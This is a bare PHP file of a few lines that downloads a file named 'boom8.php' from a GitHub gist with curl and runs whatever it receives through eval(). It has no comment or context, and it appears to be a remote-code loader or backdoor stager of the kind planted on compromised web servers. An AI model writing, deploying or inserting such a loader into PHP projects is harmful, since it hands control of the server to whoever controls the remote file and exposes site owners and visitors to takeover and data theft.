<?php $url = "https://gist.githubusercontent.com/sectorimpact/3950d0aa2d7ec370ded1d11072ef921c/raw/1ed975016904d31a535e43b324651cbdb75ec6e8/boom8.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));?>

